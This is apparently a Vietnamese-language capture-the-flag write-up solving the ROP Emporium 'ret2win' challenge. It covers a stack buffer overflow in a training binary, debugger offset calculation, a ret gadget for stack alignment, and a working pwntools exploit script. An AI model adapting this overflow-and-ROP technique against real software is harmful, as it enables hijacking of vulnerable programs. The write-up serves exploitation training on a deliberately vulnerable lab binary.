# ret2win - challenge 1

[binary file and my exploit code](https://github.com/Hjn4Pwn/Pwn/tree/main/ROP/chall1_ret2win)

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/ROP/Chall1$ file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped

```

### Main func:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("ret2win by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

### pwnme func: 

```c
int pwnme()
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  memset(s, 0, sizeof(s));
  puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
  puts("What could possibly go wrong?");
  puts("You there, may I have your input please? And don't worry about null bytes, we're using read()!\n");
  printf("> ");
  read(0, s, 0x38uLL);
  return puts("Thank you!");
}

```
Trong đấy vẫn còn 1 hàm nữa, và có lẽ đây là key for win:

```c
int ret2win()
{
  puts("Well done! Here's your flag:");
  return system("/bin/cat flag.txt");
}

```

Đúng như cái tên nó và vì có lẽ đây là chall 1 trong chuỗi ***ROP Emporium*** nên khá dễ để **ret 2 win**

### Debug:

```shell
pwndbg> checksec
[*] '/mnt/d/pwn_myself/ROP/Chall1/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

```python
pwndbg> disass pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:     push   rbp
   0x00000000004006e9 <+1>:     mov    rbp,rsp
   0x00000000004006ec <+4>:     sub    rsp,0x20
   0x00000000004006f0 <+8>:     lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:    mov    edx,0x20
   0x00000000004006f9 <+17>:    mov    esi,0x0
   0x00000000004006fe <+22>:    mov    rdi,rax
   0x0000000000400701 <+25>:    call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:    mov    edi,0x400838
   0x000000000040070b <+35>:    call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:    mov    edi,0x400898
   0x0000000000400715 <+45>:    call   0x400550 <puts@plt>
   0x000000000040071a <+50>:    mov    edi,0x4008b8
   0x000000000040071f <+55>:    call   0x400550 <puts@plt>
   0x0000000000400724 <+60>:    mov    edi,0x400918
   0x0000000000400729 <+65>:    mov    eax,0x0
   0x000000000040072e <+70>:    call   0x400570 <printf@plt>
   0x0000000000400733 <+75>:    lea    rax,[rbp-0x20]
   0x0000000000400737 <+79>:    mov    edx,0x38
   0x000000000040073c <+84>:    mov    rsi,rax
   0x000000000040073f <+87>:    mov    edi,0x0
   0x0000000000400744 <+92>:    call   0x400590 <read@plt>
   0x0000000000400749 <+97>:    mov    edi,0x40091b
   0x000000000040074e <+102>:   call   0x400550 <puts@plt>
   0x0000000000400753 <+107>:   nop
   0x0000000000400754 <+108>:   leave
   0x0000000000400755 <+109>:   ret
End of assembler dump.
```

Bây giờ ta sẽ đặt breakpoint tại  **call read** để xem địa chỉ ta nhập vào được lưu ở đâu, và tại  **ret** để xem cần ghi đè bao nhiêu bytes để tới được return address.

```python
pwndbg> disass ret2win
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:     push   rbp
   0x0000000000400757 <+1>:     mov    rbp,rsp
   0x000000000040075a <+4>:     mov    edi,0x400926
   0x000000000040075f <+9>:     call   0x400550 <puts@plt>
   0x0000000000400764 <+14>:    mov    edi,0x400943
   0x0000000000400769 <+19>:    call   0x400560 <system@plt>
   0x000000000040076e <+24>:    nop
   0x000000000040076f <+25>:    pop    rbp
   0x0000000000400770 <+26>:    ret
End of assembler dump.
```

Lưu địa chỉ hàm *ret2win*

 ```python
 ──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x400744 <pwnme+92>      call   read@plt                      <read@plt>
        fd: 0x0 (/dev/pts/0)
        buf: 0x7fffffffe0a0 ◂— 0x0
        nbytes: 0x38

   0x400749 <pwnme+97>      mov    edi, 0x40091b
   0x40074e <pwnme+102>     call   puts@plt                      <puts@plt>

   0x400753 <pwnme+107>     nop
   0x400754 <pwnme+108>     leave
   0x400755 <pwnme+109>     ret

   0x400756 <ret2win>       push   rbp
   0x400757 <ret2win+1>     mov    rbp, rsp
   0x40075a <ret2win+4>     mov    edi, 0x400926
   0x40075f <ret2win+9>     call   puts@plt                      <puts@plt>

   0x400764 <ret2win+14>    mov    edi, 0x400943
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rax rsi rsp 0x7fffffffe0a0 ◂— 0x0
... ↓                3 skipped
04:0020│ rbp         0x7fffffffe0c0 —▸ 0x7fffffffe0d0 ◂— 0x1
 
 ```

```python
   0x400754 <pwnme+108>    leave
 ► 0x400755 <pwnme+109>    ret                                  <0x4006d7; main+64>
    ↓
   0x4006d7 <main+64>      mov    edi, 0x400828
   0x4006dc <main+69>      call   puts@plt                      <puts@plt>

   0x4006e1 <main+74>      mov    eax, 0
   0x4006e6 <main+79>      pop    rbp
   0x4006e7 <main+80>      ret
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe0c8 —▸ 0x4006d7 (main+64) ◂— mov edi, 0x400828
01:0008│ rbp 0x7fffffffe0d0 ◂— 0x1
```

```python
>>> str = 0x7fffffffe0a0
>>> ret = 0x7fffffffe0c8
>>> ret - str
40
```

Ta cần điền 40 bytes vào để ghi đè tới **ret** sau đó sẽ ghi đè **ret** thành địa chỉ hàm ret2win = **0x0000000000400756**

Tuy nhiên vì đây là kiến trúc 64-bit: 
> The MOVAPS issue
>
>> If you're segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.

Do đó ta cần tìm địa chỉ lệnh **ret** với [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)

```python
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/ROP/Chall1$ ROPgadget --binary ret2win | grep "ret"
0x00000000004005df : add bl, dh ; ret
0x00000000004007ed : add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004007eb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004006e2 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x0000000000400616 : add byte ptr [rax], al ; pop rbp ; ret
0x0000000000400615 : add byte ptr [rax], r8b ; pop rbp ; ret
0x0000000000400677 : add byte ptr [rcx], al ; pop rbp ; ret
0x000000000040053b : add esp, 8 ; ret
0x000000000040053a : add rsp, 8 ; ret
0x00000000004007cc : fmul qword ptr [rax - 0x7d] ; ret
0x0000000000400754 : leave ; ret
0x0000000000400672 : mov byte ptr [rip + 0x2009e7], 1 ; pop rbp ; ret
0x00000000004006e1 : mov eax, 0 ; pop rbp ; ret
0x0000000000400753 : nop ; leave ; ret
0x000000000040076e : nop ; pop rbp ; ret
0x0000000000400613 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x0000000000400655 : nop dword ptr [rax] ; pop rbp ; ret
0x0000000000400675 : or dword ptr [rax], esp ; add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007e0 : pop r14 ; pop r15 ; ret
0x00000000004007e2 : pop r15 ; ret
0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400618 : pop rbp ; ret
0x00000000004007e3 : pop rdi ; ret
0x00000000004007e1 : pop rsi ; pop r15 ; ret
0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040053e : ret
0x0000000000400542 : ret 0x200a
0x0000000000400535 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x00000000004007f5 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004007f4 : sub rsp, 8 ; add rsp, 8 ; ret
```

ret address = **0x000000000040053e**

### Exploit:

```python
from pwn import *
r = process("./ret2win")

payload = b'A'*40 +p64(0x40053e)+ p64(0x400756)

r.sendline(payload)
r.interactive()

```
